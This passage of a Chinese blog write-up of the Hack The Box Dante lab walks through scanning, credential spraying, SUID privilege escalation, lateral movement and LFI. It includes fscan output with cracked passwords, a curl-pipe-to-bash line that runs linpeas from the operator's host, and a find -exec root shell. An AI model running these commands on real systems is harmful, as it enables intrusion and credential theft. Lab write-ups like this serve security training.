[*] 端口开放 172.16.1.12:21</span><br><span class="line">[7.0s] [*] 端口开放 172.16.1.12:22</span><br><span class="line">[7.0s] [*] 端口开放 172.16.1.10:139</span><br><span class="line">[7.0s] [*] 端口开放 172.16.1.19:80</span><br><span class="line">[7.0s] [*] 端口开放 172.16.1.17:10000</span><br><span class="line">[7.0s] [*] 端口开放 172.16.1.5:135</span><br><span class="line">[7.0s] [*] 端口开放 172.16.1.5:445</span><br><span class="line">[7.0s] [*] 端口开放 172.16.1.19:8080</span><br><span class="line">[7.0s] [*] 端口开放 172.16.1.5:139</span><br><span class="line">[7.0s] [*] 端口开放 172.16.1.5:21</span><br><span class="line">[7.0s] [*] 端口开放 172.16.1.5:1433</span><br><span class="line">[10.0s]     扫描完成, 发现 37 个开放端口</span><br><span class="line">[10.0s]     存活端口数量: 37</span><br><span class="line">[10.0s]     开始漏洞扫描</span><br><span class="line">[mysql] 2026/07/14 03:41:52 connection.go:49: busy buffer</span><br><span class="line">[mysql] 2026/07/14 03:41:52 connection.go:49: busy buffer</span><br><span class="line">[mysql] 2026/07/14 03:41:52 connection.go:49: busy buffer</span><br><span class="line">[mysql] 2026/07/14 03:41:52 connection.go:49: busy buffer</span><br><span class="line">[mysql] 2026/07/14 03:41:52 connection.go:49: busy buffer</span><br><span class="line">[mysql] 2026/07/14 03:41:52 connection.go:49: busy buffer</span><br><span class="line">[mysql] 2026/07/14 03:41:52 connection.go:49: busy buffer</span><br><span class="line">[mysql] 2026/07/14 03:41:52 connection.go:49: busy buffer</span><br><span class="line">[mysql] 2026/07/14 03:41:52 connection.go:49: busy buffer</span><br><span class="line">[mysql] 2026/07/14 03:41:52 connection.go:49: busy buffer</span><br><span class="line">[10.0s] [+] 172.16.1.101 CVE-2020-0796 SmbGhost Vulnerable</span><br><span class="line">[10.0s] [+] 172.16.1.13 CVE-2020-0796 SmbGhost Vulnerable</span><br><span class="line">[10.0s] [*] NetInfo 扫描结果</span><br><span class="line">目标主机: 172.16.1.5</span><br><span class="line">主机名: DANTE-SQL01</span><br><span class="line">发现的网络接口:</span><br><span class="line">   IPv4地址:</span><br><span class="line">      └─ 172.16.1.5</span><br><span class="line">[10.0s] [*] NetInfo 扫描结果</span><br><span class="line">目标主机: 172.16.1.101</span><br><span class="line">主机名: DANTE-WS02</span><br><span class="line">发现的网络接口:</span><br><span class="line">   IPv4地址:</span><br><span class="line">      └─ 172.16.1.101</span><br><span class="line">[10.1s] [+] NetBios 172.16.1.101    WORKGROUP\DANTE-WS02          </span><br><span class="line">[10.1s] [+] NetBios 172.16.1.102    WORKGROUP\DANTE-WS03          </span><br><span class="line">[10.1s] [+] SMB认证成功 172.16.1.17:445 administrator:P@ssword123</span><br><span class="line">[10.1s] [*] NetInfo 扫描结果</span><br><span class="line">目标主机: 172.16.1.102</span><br><span class="line">主机名: DANTE-WS03</span><br><span class="line">发现的网络接口:</span><br><span class="line">   IPv4地址:</span><br><span class="line">      └─ 172.16.1.102</span><br><span class="line">[10.1s] [*] 网站标题 http://172.16.1.102       状态码:200 长度:1237   标题:Dante Marriage Registration System :: Home Page</span><br><span class="line">[10.1s] [*] 网站标题 http://172.16.1.13        状态码:302 长度:0      标题:无标题 重定向地址: http://172.16.1.13/dashboard/</span><br><span class="line">[10.1s] [*] 网站标题 https://172.16.1.12       状态码:302 长度:0      标题:无标题 重定向地址: https://172.16.1.12/dashboard/</span><br><span class="line">[10.1s] [*] 网站标题 http://172.16.1.100       状态码:200 长度:10918  标题:Apache2 Ubuntu Default Page: It works</span><br><span class="line">[10.1s] [*] 网站标题 http://172.16.1.10        状态码:200 长度:28842  标题:Dante Hosting</span><br><span class="line">[10.1s] [+] NetBios 172.16.1.17     WORKGROUP\DANTE-NIX03         </span><br><span class="line">[10.1s] [+] 172.16.1.102 CVE-2020-0796 SmbGhost Vulnerable</span><br><span class="line">[10.1s] [*] 网站标题 http://172.16.1.17        状态码:200 长度:963    标题:Index of /</span><br><span class="line">[10.1s] [*] 网站标题 http://172.16.1.13/dashboard/ 状态码:200 长度:7576   标题:Welcome to XAMPP</span><br><span class="line">[10.1s] [*] 网站标题 https://172.16.1.12/dashboard/ 状态码:200 长度:7574   标题:Welcome to XAMPP</span><br><span class="line">[10.1s] [*] 网站标题 http://172.16.1.19        状态码:200 长度:553    标题:Index of /</span><br><span class="line">[10.2s] [*] 网站标题 http://172.16.1.12        状态码:302 长度:0      标题:无标题 重定向地址: http://172.16.1.12/dashboard/</span><br><span class="line">[10.2s]     POC加载完成: 总共387个，成功387个，失败0个</span><br><span class="line">[10.2s] [+] FTP服务 172.16.1.5:21 匿名登录成功!</span><br><span class="line">[10.2s] [*] 网站标题 https://172.16.1.13       状态码:302 长度:0      标题:无标题 重定向地址: https://172.16.1.13/dashboard/</span><br><span class="line">[10.2s] [+] SMB认证成功 172.16.1.10:445 administrator:pass@123</span><br><span class="line">[10.2s] [*] 网站标题 https://172.16.1.102      状态码:200 长度:1237   标题:Dante Marriage Registration System :: Home Page</span><br><span class="line">[10.2s] [+] NetBios 172.16.1.5      WORKGROUP\DANTE-SQL01               Windows Server 2016 Standard 14393</span><br><span class="line">[10.2s] [*] 网站标题 http://172.16.1.12/dashboard/ 状态码:200 长度:7574   标题:Welcome to XAMPP</span><br><span class="line">[10.3s] [+] FTP服务 172.16.1.100:21 匿名登录成功!</span><br><span class="line">[10.3s] [*] 网站标题 http://172.16.1.19:8080   状态码:403 长度:793    标题:无标题</span><br><span class="line">[10.3s] [*] 网站标题 https://172.16.1.13/dashboard/ 状态码:200 长度:7576   标题:Welcome to XAMPP</span><br><span class="line">[10.3s]     SMB2共享信息 172.16.1.17:445 administrator Pass:P@ssword123 共享:[forensics IPC$]</span><br><span class="line">[10.3s] [*] 网站标题 http://172.16.1.17:10000  状态码:200 长度:4622   标题:Login to Webmin</span><br><span class="line">[10.4s]     SMB2共享信息 172.16.1.17:445 administrator Pass:123456 共享:[forensics IPC$]</span><br><span class="line">[10.4s]     SMB2共享信息 172.16.1.17:445 administrator Pass:password 共享:[forensics IPC$]</span><br><span class="line">[10.4s]     SMB2共享信息 172.16.1.17:445 administrator Pass: 共享:[forensics IPC$]</span><br><span class="line">[10.4s]     SMB2共享信息 172.16.1.10:445 administrator Pass: 共享:[print$ SlackMigration IPC$]</span><br><span class="line">[10.4s]     SMB2共享信息 172.16.1.17:445 administrator Pass:admin 共享:[forensics IPC$]</span><br><span class="line">[10.4s]     SMB2共享信息 172.16.1.17:445 administrator Pass:admin123 共享:[forensics IPC$]</span><br><span class="line">[10.4s]     SMB2共享信息 172.16.1.10:445 administrator Pass:Password 共享:[print$ SlackMigration IPC$]</span><br><span class="line">[10.4s]     SMB2共享信息 172.16.1.10:445 administrator Pass:admin123 共享:[print$ SlackMigration IPC$]</span><br><span class="line">[10.4s]     SMB2共享信息 172.16.1.10:445 administrator Pass:pass@123 共享:[print$ SlackMigration IPC$]</span><br><span class="line">[10.4s]     SMB2共享信息 172.16.1.10:445 administrator Pass:admin 共享:[print$ SlackMigration IPC$]</span><br><span class="line">[10.4s]     SMB2共享信息 172.16.1.10:445 administrator Pass:root 共享:[print$ SlackMigration IPC$]</span><br><span class="line">[10.4s]     SMB2共享信息 172.16.1.17:445 administrator Pass:pass123 共享:[forensics IPC$]</span><br><span class="line">[10.4s]     SMB2共享信息 172.16.1.10:445 administrator Pass:pass123 共享:[print$ SlackMigration IPC$]</span><br><span class="line">[10.4s]     SMB2共享信息 172.16.1.17:445 administrator Pass:Password 共享:[forensics IPC$]</span><br><span class="line">[10.4s]     SMB2共享信息 172.16.1.10:445 administrator Pass:123456 共享:[print$ SlackMigration IPC$]</span><br><span class="line">[10.4s]     SMB2共享信息 172.16.1.17:445 administrator Pass:pass@123 共享:[forensics IPC$]</span><br><span class="line">[10.4s]     SMB2共享信息 172.16.1.10:445 administrator Pass:P@ssword123 共享:[print$ SlackMigration IPC$]</span><br><span class="line">[10.5s]     SMB2共享信息 172.16.1.17:445 administrator Pass:root 共享:[forensics IPC$]</span><br><span class="line">[10.5s]     SMB2共享信息 172.16.1.10:445 administrator Pass:password 共享:[print$ SlackMigration IPC$]</span><br><span class="line">[mysql] 2026/07/14 03:41:53 connection.go:49: busy buffer</span><br></pre></td></tr></table></figure>
+
+<h6 id="fscan（部分主机名来自后面的补充）"><a href="#fscan（部分主机名来自后面的补充）" class="headerlink" title="fscan（部分主机名来自后面的补充）"></a>fscan（部分主机名来自后面的补充）</h6><table>
+<thead>
+<tr>
+<th><font style="color:rgb(15, 17, 21);">IP地址</font></th>
+<th><font style="color:rgb(15, 17, 21);">主机名</font></th>
+<th><font style="color:rgb(15, 17, 21);">关键开放端口</font></th>
+<th><font style="color:rgb(15, 17, 21);">重要发现 &#x2F; 漏洞</font></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><font style="color:#DF2A3F;">172.16.1.100  </font></td>
+<td><font style="color:#DF2A3F;">DANTE-WEB-NIX01 10.10.110.100(入口机，拿下）</font></td>
+<td>80.81.22.21</td>
+<td><font style="color:rgb(15, 17, 21);"> FTP 匿名  </font></td>
+</tr>
+<tr>
+<td><font style="color:#DF2A3F;">172.16.1.101</font></td>
+<td><font style="color:#DF2A3F;">DANTE-WS02（拿下）</font></td>
+<td><font style="color:rgb(15, 17, 21);">21, 135, 139, 445</font></td>
+<td><font style="color:rgb(15, 17, 21);">SmbGhost (CVE-2020-0796)</font><font style="color:rgb(15, 17, 21);"> </font><font style="color:rgb(15, 17, 21);">漏洞</font></td>
+</tr>
+<tr>
+<td><font style="color:#DF2A3F;">172.16.1.102</font></td>
+<td><font style="color:#DF2A3F;">DANTE-WS03（拿下）</font></td>
+<td><font style="color:rgb(15, 17, 21);">80, 135, 139, 443, 445, 3306</font></td>
+<td><font style="color:rgb(15, 17, 21);">SmbGhost 漏洞</font><font style="color:rgb(15, 17, 21);">，运行“Dante Marriage Registration System”</font></td>
+</tr>
+<tr>
+<td><font style="color:#DF2A3F;">172.16.1.5</font></td>
+<td><font style="color:#DF2A3F;">DANTE-SQL01(拿下）</font></td>
+<td><font style="color:rgb(15, 17, 21);">21, 135, 139, 445, 1433</font></td>
+<td><font style="color:rgb(15, 17, 21);">FTP 匿名登录成功</font><font style="color:rgb(15, 17, 21);">，Windows Server 2016</font></td>
+</tr>
+<tr>
+<td><font style="color:#DF2A3F;">172.16.1.10</font></td>
+<td><font style="color:#DF2A3F;">DANTE-NIX02（拿下）</font></td>
+<td><font style="color:rgb(15, 17, 21);">22, 80, 139, 445</font></td>
+<td><font style="color:rgb(15, 17, 21);">SMB 认证成功</font><font style="color:rgb(15, 17, 21);"> </font><code>&lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;administrator:pass@123&lt;/font&gt;</code></td>
+</tr>
+<tr>
+<td><font style="color:#DF2A3F;">172.16.1.12</font></td>
+<td><font style="color:#DF2A3F;">DANTE-NIX04（拿下）</font></td>
+<td><font style="color:rgb(15, 17, 21);">21, 22, 80, 443, 3306</font></td>
+<td><font style="color:rgb(15, 17, 21);">运行 XAMPP</font></td>
+</tr>
+<tr>
+<td><font style="color:#DF2A3F;">172.16.1.13</font></td>
+<td><font style="color:#DF2A3F;">DANTE-WS01（拿下）</font></td>
+<td><font style="color:rgb(15, 17, 21);">80, 443, 445</font></td>
+<td><font style="color:rgb(15, 17, 21);">SmbGhost 漏洞</font><font style="color:rgb(15, 17, 21);">，运行 XAMPP</font></td>
+</tr>
+<tr>
+<td><font style="color:#DF2A3F;">172.16.1.17</font></td>
+<td><font style="color:#DF2A3F;">DANTE-NIX03（拿下）</font></td>
+<td><font style="color:rgb(15, 17, 21);">80, 139, 445, 10000</font></td>
+<td><font style="color:rgb(15, 17, 21);">SMB 认证成功</font><font style="color:rgb(15, 17, 21);"> </font><code>&lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;administrator:P@ssword123&lt;/font&gt;</code><br/><font style="color:rgb(15, 17, 21);">，运行 Webmin</font></td>
+</tr>
+<tr>
+<td><font style="color:#DF2A3F;">172.16.1.19</font></td>
+<td><font style="color:#DF2A3F;">DANTE-NIX07（拿下）</font></td>
+<td><font style="color:rgb(15, 17, 21);">80, 8080</font></td>
+<td><font style="color:rgb(15, 17, 21);">目录列表 (Index of &#x2F;)</font></td>
+</tr>
+<tr>
+<td><font style="color:#DF2A3F;">172.16.1.20</font></td>
+<td><font style="color:#DF2A3F;">DANTE-DC01(拿下）</font></td>
+<td><font style="color:rgb(15, 17, 21);">445,80,22,139,135,389,443,88</font></td>
+<td><font style="color:rgb(15, 17, 21);">发现漏洞 172.16.1.20 MS17-010</font></td>
+</tr>
+<tr>
+<td><font style="color:#DF2A3F;">172.16.2.5</font></td>
+<td><font style="color:#DF2A3F;">DANTE-DC02（拿下）</font></td>
+<td>88,135,139,445</td>
+<td><font style="color:rgb(15, 17, 21);"></font></td>
+</tr>
+<tr>
+<td><font style="color:#DF2A3F;">172.16.2.101</font></td>
+<td><font style="color:#DF2A3F;">DANTE-ADMIN-NIX05（拿下）</font></td>
+<td>22</td>
+<td><font style="color:rgb(15, 17, 21);"></font></td>
+</tr>
+<tr>
+<td><font style="color:#DF2A3F;">172.16.2.6</font></td>
+<td><font style="color:#DF2A3F;">DANTE-ADMIN-NIX06（拿下）</font></td>
+<td>22</td>
+<td><font style="color:rgb(15, 17, 21);"></font></td>
+</tr>
+</tbody></table>
+<p>挂的代理能挂上，但不稳定，很多命令也无权限，先在shell里提权</p>
+<p><strong><font style="color:rgb(15, 17, 21);background-color:#E8F7CF;">TTY：</font><strong><strong><font style="color:rgb(15, 17, 21);background-color:#E8F7CF;">当前 Shell 可能不是完整的终端，先用 Python 生成一个</font></strong></strong><font style="color:rgb(15, 17, 21);">：</font></strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(15, 17, 21);">执行后，提示符可能会变化，此时再尝试 </font><code>&lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;su&lt;/font&gt;</code><font style="color:rgb(15, 17, 21);">。</font></p>
+<p><font style="color:rgb(15, 17, 21);">切换至 </font><code>&lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;james&lt;/font&gt;</code><font style="color:rgb(15, 17, 21);"> 用户</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su james</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(15, 17, 21);">输入密码：</font><code>&lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;Toyota&lt;/font&gt;</code><font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">，</font><font style="color:rgb(15, 17, 21);">变成 </font><code>&lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;james&lt;/font&gt;</code><font style="color:rgb(15, 17, 21);"> 用户，</font><font style="color:rgb(15, 17, 21);">但 </font><code>&lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;james&lt;/font&gt;</code><font style="color:rgb(15, 17, 21);"> 没有 sudo 权限，现在需要继续提权</font></p>
+<p><strong><font style="color:rgb(15, 17, 21);">切换至 </font></strong><code>**&lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;balthazar&lt;/font&gt;**</code><strong><font style="color:rgb(15, 17, 21);"> 用户</font></strong></p>
+<p><font style="color:rgb(15, 17, 21);">但是没有密码，查找终端历史，找到了mysql的</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u balthazar -p TheJoker12345!</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(15, 17, 21);">复用TheJoker12345!密码，登录上了</font><code>**&lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;balthazar&lt;/font&gt;**</code><strong><font style="color:rgb(15, 17, 21);"> 用户</font></strong></p>
+<p><font style="color:rgb(15, 17, 21);">但是权限还是低，还是要提权到root,那就找提权漏洞</font></p>
+<p><strong><font style="color:rgb(15, 17, 21);">运行 </font></strong><code>**&lt;font style=&quot;color:rgb(15, 17, 21);background-color:#FBF5CB;&quot;&gt;linpeas.sh&lt;/font&gt;**</code><strong><font style="color:rgb(15, 17, 21);"> 自动化枚举，</font>****<font style="color:rgb(15, 17, 21);">可以快速发现提权路径</font></strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.16.59:8000/linpeas.sh | bash &gt; /tmp/linpeas.txt</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(15, 17, 21);">结果：</font></p>
+<ol>
+<li><strong><font style="color:rgb(15, 17, 21);">SUID 提权（最简单直接）</font></strong><ul>
+<li><code>**&lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;/usr/bin/find&lt;/font&gt;**</code><font style="color:rgb(15, 17, 21);"> 设置了 SUID 位。可以利用 </font><code>&lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;-exec&lt;/font&gt;</code><font style="color:rgb(15, 17, 21);"> 参数以 root 身份执行命令</font></li>
+<li><code>**&lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;/usr/bin/pkexec&lt;/font&gt;**</code><font style="color:rgb(15, 17, 21);"> 也可能存在漏洞 (CVE-2021-4034)</font></li>
+</ul>
+</li>
+<li><strong><font style="color:rgb(15, 17, 21);">内核漏洞</font></strong><ul>
+<li><font style="color:rgb(15, 17, 21);">系统内核为 </font><code>&lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;5.4.0-29-generic&lt;/font&gt;</code><font style="color:rgb(15, 17, 21);">，已检测到多个可能存在的内核漏洞，包括 </font><strong><font style="color:rgb(15, 17, 21);">CVE-2021-3493 (Ubuntu OverlayFS)</font></strong><font style="color:rgb(15, 17, 21);">、</font><strong><font style="color:rgb(15, 17, 21);">CVE-2022-32250 (nft_object UAF)</font></strong><font style="color:rgb(15, 17, 21);"> 等</font></li>
+</ul>
+</li>
+<li><strong><font style="color:rgb(15, 17, 21);">文件与凭证</font></strong><ul>
+<li><font style="color:rgb(15, 17, 21);">发现了 WordPress 的备份配置文件</font><font style="color:rgb(15, 17, 21);"> </font><code>&lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;/var/www/html/wordpress.bak/wp-config.php&lt;/font&gt;</code><font style="color:rgb(15, 17, 21);">，其中包含数据库凭证</font><font style="color:rgb(15, 17, 21);"> </font><code>&lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;shaun:password&lt;/font&gt;</code><font style="color:rgb(15, 17, 21);">。</font></li>
+<li><font style="color:rgb(15, 17, 21);">MySQL 以 </font><code>&lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;mysql&lt;/font&gt;</code><font style="color:rgb(15, 17, 21);"> 用户运行，但密码未知</font></li>
+<li><code>&lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;balthazar&lt;/font&gt;</code><font style="color:rgb(15, 17, 21);"> </font><font style="color:rgb(15, 17, 21);">用户目录下存在</font><font style="color:rgb(15, 17, 21);"> </font><code>&lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;.ssh&lt;/font&gt;</code><font style="color:rgb(15, 17, 21);"> </font><font style="color:rgb(15, 17, 21);">文件夹，可能有私钥。</font></li>
+</ul>
+</li>
+<li><strong><font style="color:rgb(15, 17, 21);">计划任务 (Cron)</font></strong><ul>
+<li><code>&lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;/etc/cron.d/&lt;/font&gt;</code><font style="color:rgb(15, 17, 21);"> </font><font style="color:rgb(15, 17, 21);">中有一个</font><font style="color:rgb(15, 17, 21);"> </font><code>&lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;php&lt;/font&gt;</code><font style="color:rgb(15, 17, 21);"> </font><font style="color:rgb(15, 17, 21);">文件，但内容未知，需要检查是否有可写的脚本以 root 权限运行。</font></li>
+<li><font style="color:rgb(15, 17, 21);">系统存在 </font><code>&lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;anacron&lt;/font&gt;</code><font style="color:rgb(15, 17, 21);">，可能会定期执行任务</font></li>
+</ul>
+</li>
+</ol>
+<p><strong><font style="color:rgb(15, 17, 21);">利用 SUID </font></strong><code>**&lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;/usr/bin/find&lt;/font&gt;**</code><strong><font style="color:rgb(15, 17, 21);"> 提权</font></strong></p>
+<ul>
+<li><strong><font style="color:rgb(15, 17, 21);">原理</font></strong><font style="color:rgb(15, 17, 21);">：</font><code>&lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;find&lt;/font&gt;</code><font style="color:rgb(15, 17, 21);"> 以 SUID root 权限运行，</font><code>&lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;-exec&lt;/font&gt;</code><font style="color:rgb(15, 17, 21);"> 可以执行任意命令</font></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -type f -exec /bin/bash -p \; -quit</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(15, 17, 21);"> </font><!-- 这是一张图片，ocr 内容为： --><br><img src="/img/htb/htb-dante-017.png"></p>
+<p>flag2：DANTE{Too_much_Pr1v!!!!}</p>
+<p><font style="color:rgb(52, 52, 60);">james 的 目录下还有一个flag，用这个shell一起拿了</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /home/james/flag.txt </span><br></pre></td></tr></table></figure>
+
+<p>flag3 ：DANTE{j4m3s_NEEd5_a_p455w0rd_M4n4ger!}</p>
+<p>现在要利用之前fscan扫出来的东西横向：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-018.png"></p>
+<p>用smb横向</p>
+<p><strong>使用代理扫描内网 SMB 主机</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains netexec smb 172.16.1.0/24 -u administrator -p pass@123 --shares</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(15, 17, 21);">关键点：</font></p>
+<ul>
+<li><code>&lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;172.16.1.10&lt;/font&gt;</code><font style="color:rgb(15, 17, 21);">（DANTE-NIX02）</font><font style="color:rgb(15, 17, 21);">：存在共享</font><font style="color:rgb(15, 17, 21);"> </font><code>&lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;SlackMigration&lt;/font&gt;</code><font style="color:rgb(15, 17, 21);">（只读）。</font></li>
+<li><code>&lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;172.16.1.17&lt;/font&gt;</code><font style="color:rgb(15, 17, 21);">（DANTE-NIX03）</font><font style="color:rgb(15, 17, 21);">：存在共享</font><font style="color:rgb(15, 17, 21);"> </font><code>&lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;forensics&lt;/font&gt;</code><font style="color:rgb(15, 17, 21);">（读写）。</font></li>
+<li><font style="color:rgb(15, 17, 21);">两个 Linux Samba 服务器都接受 </font><code>&lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;administrator:pass@123&lt;/font&gt;</code><font style="color:rgb(15, 17, 21);"> 和 </font><code>&lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;james:Toyota&lt;/font&gt;</code><font style="color:rgb(15, 17, 21);"> 作为 Guest 用户（无实际权限），但我们可以尝试访问共享。</font></li>
+</ul>
+<p><font style="color:rgb(15, 17, 21);">访问 </font><code>&lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;172.16.1.10&lt;/font&gt;</code><font style="color:rgb(15, 17, 21);"> 的 </font><code>&lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;SlackMigration&lt;/font&gt;</code><font style="color:rgb(15, 17, 21);"> 共享</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains smbclient //172.16.1.10/SlackMigration -U james%Toyota -c &#x27;ls&#x27;</span><br><span class="line"></span><br><span class="line">proxychains smbclient //172.16.1.17/forensics -U administrator%pass@123 -c &#x27;ls&#x27;</span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-019.png">  </p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-020.png"></p>
+<p>分别发现admintasks.txt，monitor</p>
+<p>下载下来：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains smbclient //172.16.1.10/SlackMigration -U james%Toyota -c &#x27;get admintasks.txt&#x27;</span><br><span class="line"></span><br><span class="line">proxychains smbclient //172.16.1.17/forensics -U administrator%pass@123 -c &#x27;get monitor&#x27;</span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-021.png"></p>
+<ol>
+<li><strong><font style="color:rgb(15, 17, 21);">从 Web 根目录移除 WordPress 安装</font></strong><font style="color:rgb(15, 17, 21);"> —— 待处理</font></li>
+<li><strong><font style="color:rgb(15, 17, 21);">恢复 Ubuntu 机器上的 Slack 集成</font></strong><font style="color:rgb(15, 17, 21);"> </font><font style="color:rgb(15, 17, 21);">—— 待处理</font></li>
+<li><strong><font style="color:rgb(15, 17, 21);">移除旧员工账户</font></strong><font style="color:rgb(15, 17, 21);"> </font><font style="color:rgb(15, 17, 21);">—— 已完成</font></li>
+<li><strong><font style="color:rgb(15, 17, 21);">通知 Margaret 新的变更</font></strong><font style="color:rgb(15, 17, 21);"> </font><font style="color:rgb(15, 17, 21);">—— 已完成</font></li>
+<li><strong><font style="color:rgb(15, 17, 21);">移除 Margaret 账户在晋升为管理员后的权限限制</font></strong><font style="color:rgb(15, 17, 21);"> —— 待处理</font></li>
+</ol>
+<p><strong><font style="color:rgb(15, 17, 21);">说明：</font>****<font style="color:rgb(15, 17, 21);">存在共享 </font></strong><code>**&lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;SlackMigration&lt;/font&gt;**</code><strong><font style="color:rgb(15, 17, 21);">与Slack有关，Margaret 账户 已被提升为管理员</font></strong></p>
+<p><font style="color:rgb(15, 17, 21);">monitor文件用wireshark打开</font></p>
+<p>发现用户名密码</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-022.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-023.png"></p>
+<ul>
+<li><font style="color:rgb(52, 52, 60);">admin&#x2F;password6543</font></li>
+<li><font style="color:rgb(52, 52, 60);">admin&#x2F;Password6543</font></li>
+</ul>
+<p>之前的**<font style="color:rgb(15, 17, 21);">其他站点</font><strong><strong>存在</strong></strong><font style="color:rgb(15, 17, 21);">本地文件包含（LFI）漏洞还没用</font>**</p>
+<h2 id="Linux-172-16-1-10"><a href="#Linux-172-16-1-10" class="headerlink" title="Linux: 172.16.1.10"></a><font style="color:rgb(42, 42, 42);">Linux: 172.16.1.10</font></h2><p>挂代理访问 <a target="_blank" rel="noopener" href="http://172.16.1.10/">http://172.16.1.10/</a>,存在文件包含</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-024.png"><br> <!-- 这是一张图片，ocr 内容为： --><br><img src="/img/htb/htb-dante-025.png"></p>
+<p><font style="color:rgb(15, 17, 21);">路径穿越拿到etc&#x2F;passwd</font></p>
+<p><font style="color:rgb(15, 17, 21);">发现两个关键用户：</font></p>
+<ul>
+<li><code>**&lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;frank&lt;/font&gt;**</code><font style="color:rgb(15, 17, 21);">（普通用户，bash）</font></li>
+<li><code>**&lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;margaret&lt;/font&gt;**</code><font style="color:rgb(15, 17, 21);">（高权限）</font></li>
+</ul>
+<p><font style="color:rgb(15, 17, 21);">margaret目录可直接访问，有flag</font></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-026.png"></p>
